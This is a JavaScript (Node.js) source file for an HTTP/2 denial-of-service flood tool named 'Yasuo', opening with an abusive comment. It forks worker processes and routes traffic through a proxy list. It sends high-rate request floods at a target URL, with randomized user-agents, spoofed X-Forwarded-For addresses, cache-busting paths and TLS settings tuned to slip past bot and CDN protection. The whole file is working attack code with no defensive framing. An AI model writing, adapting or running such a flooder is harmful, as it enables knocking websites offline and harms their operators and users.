//geh nakaw pa tangina mo papakulam kitang hayop ka


process.on('uncaughtException', function(er) {});
process.on('unhandledRejection', function(er) {});

require('events').EventEmitter.defaultMaxListeners = Infinity;
process.setMaxListeners(0);

const execSync = require('child_process').execSync;
const fs = require('fs');
const cluster = require('cluster');
const http2 = require('http2');
const http = require('http');
const { HeaderGenerator } = require('header-generator');


try {
  var randstr = require('randomstring');
  var {
    constants
  } = require('crypto');
  var tls = require('tls');
  var url = require('url');
} catch {
  console.log('Installing govno...');
  execSync('npm install crypto randomstring tls url');
  process.exit();
};

randomByte = function() {
  return Math.round(Math.random()*256);
}
var RandomIP = randomByte() + '.' + randomByte() + '.' + randomByte() + '.' + randomByte()


let headerGenerator = new HeaderGenerator({
  browsers: [
      { name: "firefox", minVersion: 112, httpVersion: "2" },
      { name: "opera", minVersion: 112, httpVersion: "2" },
      { name: "edge", minVersion: 112, httpVersion: "2" },
      { name: "chrome", minVersion: 112, httpVersion: "2" },
      { name: "safari", minVersion: 16, httpVersion: "2" },
  ],
  devices: [
      "desktop",
      "mobile",
  ],
  operatingSystems: [
      "windows",
      "linux",
      "macos",
      "android",
      "ios",
  ],
  locales: ["en-US", "en"]
});
let randomHeaders = headerGenerator.getHeaders()




var Gen_Secdest = [
    'document',
    'empty',
    'object',
    'iframe',
    'frame'
];

const sigalgs = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512',
];
let SignalsList = sigalgs.join(':');
this.sigalgs = SignalsList;

var accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
],
control_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0',
    'maxage=604800',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate'
];

function ra() {
  const rsdat = randstr.generate({ "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
      "length":25
  });
  return rsdat;
}

function ra1() {
  const rsdat = randstr.generate({
      "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
      "length":25
  });
  return rsdat;
}
function ra2() {
const rsdat = randstr.generate({
    "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
    "length":25
});
return rsdat;
}
function ra3() {
  const rsdat = randstr.generate({
      "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
      "length":25
  });
  return rsdat;
}
function ra4() {
const rsdat = randstr.generate({
    "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
    "length":25
});
return rsdat;
}

function gensec() {
    return Gen_Secdest[Math.floor(Math.random() * Gen_Secdest.length)];
}

function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function controling() {
    return control_header[Math.floor(Math.random() * control_header.length)];
}

try {
  var proxies = fs.readFileSync('proxy.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
  var uas = fs.readFileSync('ua.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch (err) {
  if (err.code !== 'ENOENT') throw err;
  console.log('Proxy list / UA List not found. [proxy.txt] [ua.txt]');
  process.exit();
};

tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
tls.DEFAULT_ECDH_CURVE;
tls.authorized = true;
tls.sync = true;

if (process.argv.length < 6) {
  console.log('Yasuo <target>  <time> <threads> <rate> ');
  process.exit(0);
}

let COOKIES = undefined;
let POSTDATA = undefined;

const cplist = [
  "EECDH:!SSLv2:!SSLv3:!TLSv1:!TLSv1.1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  "EECDH:!SSLv2:!SSLv3:!TLSv1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  "EECDH:!SSLv2:!SSLv3:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  "ECDHE-ECDSA-AES128-GCM-SHA256"
];

const rIp = () => {
  const r = () => Math.floor(Math.random() * 255);
  return `${r()}.${r()}.${r()}.${r()}`;
};

var parsed = url.parse(process.argv[2]);

let headerbuilders = {
  "Cache-Control": controling(),
  'upgrade-insecure-requests': 1,
  ":method": "GET",
  ":path": parsed.path + "?" + ra1() + "=" + ra2() + "=" + ra3() + "=" + ra4() + "?yasuo=%RAND%?%RAND%",
  'Accept': accept(),
  'Accept-Encoding': randomHeaders = 'gzip, deflate, br',
  'Accept-Language': randomHeaders = 'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  "sec-ch-ua": randomHeaders = 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"',
  "sec-ch-ua-mobile": randomHeaders = '?0',
  "sec-ch-ua-platform": randomHeaders = 'Windows',
  "sec-fetch-dest": gensec(),
  "sec-fetch-site": randomHeaders = 'cross-site',
  "sec-fetch-mode": randomHeaders = 'navigate',
  "Content-Type" : randomHeaders = 'Content-Type',
  "sec-fetch-user": randomHeaders = '?1',
  "TE": randomHeaders = 'trailers',
  "Pragma": 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace'
};

if (cluster.isMaster) {
  for (let i = 0; i < process.argv[4]; i++) {
    cluster.fork();
  }
  

  setTimeout(() => {
    process.exit(1);
  }, process.argv[3] * 1000);

} else {
  startflood();
};

const agent = new http.Agent({
  keepAlive: true, // Keep sockets around even when there are no outstanding requests, so they can be used for future requests without having to reestablish a TCP connection. Defaults to false
  keepAliveMsecs: 50000, // When using the keepAlive option, specifies the initial delay for TCP Keep-Alive packets. Ignored when the keepAlive option is false or undefined. Defaults to 1000.
  maxSockets: Infinity,
  maxTotalSockets: Infinity,
  maxSockets: Infinity // Maximum number of sockets to leave open in a free state. Only relevant if keepAlive is set to true. Defaults to 256.
});

function startflood() {
  setInterval(() => {

    var cipper = cplist[Math.floor(Math.random() * cplist.length)];
    var proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');

    var req = http.get({ //set proxy session
      host: proxy[0],
      agent: agent,
      globalAgent: agent,
      ciphers: cipper,
      port: proxy[1],
      headers: {
        'Host': parsed.host,
        'Proxy-Connection': 'Keep-Alive',
        'Connection': 'Keep-Alive',
      },
      method: 'CONNECT',
      path: parsed.host + ':443'
    }, (err) => {
      req.end();
      return;
    }, function() {
      req.setSocketKeepAlive(true);
    });

    req.on('connect', function(res, socket, head) {

      const client = http2.connect(parsed.href, {
        createConnection: () => tls.connect({
          host: parsed.host,
          ciphers: cipper,
          secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_SSLv2,
          servername: parsed.host,
          curve: "GREASE:X25519:x25519",
          rejectUnauthorized: false,
          challengesToSolve: 5,
          sigalgs: this.sigalgs,
          cloudflareTimeout: 5000,
          cloudflareMaxTimeout: 30000,
          maxRedirects: 20,
          followAllRedirects: true,
          decodeEmails: false,
          gzip: true,
          simple: false,
          brotli: true,
          jar: true,
          deflate: true,
          secure: true,
          ALPNProtocols: ['h2'],
          secureProtocol: ['TLSv1_2_method','TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
          sessionTimeout: 5000,
          socket: socket
        }, function() {

          for (let i = 0; i < process.argv[5]; i++) {

            headerbuilders["user-agent"] = uas[Math.floor(Math.random() * uas.length)];
            headerbuilders["X-Forwarded-For"] = RandomIP;
            headerbuilders["Cookie"] = ra();
            headerbuilders["Referer"] = process.argv[2] + '?' + randstr.generate({
              length: 10,
              charset: "abcdefghijklmnopqstuvwxyz0123456789"
            });
            headerbuilders["Origin"] = 'https://' + randstr.generate({
              length: 8,
              charset: "abcdefghijklmnopqstuvwxyz0123456789"
            }) + '.com'
            client.request(headerbuilders).close()

            const req = client.request(headerbuilders);
            req.setEncoding('utf8');
            req.end();
            req.on('disconnected', () => {
              req.destroy();
            });
            req.on('timeout', () => {
              req.destroy();
            });
            req.on('error', (err) =>{
              req.destroy();
            });
            req.on('data', (chunk) => {
              setTimeout(function () {
                req.destroy();
                return delete req
              }, 10000)
            })
          };

        })
      });
    }).end();

    req.end();

  });

};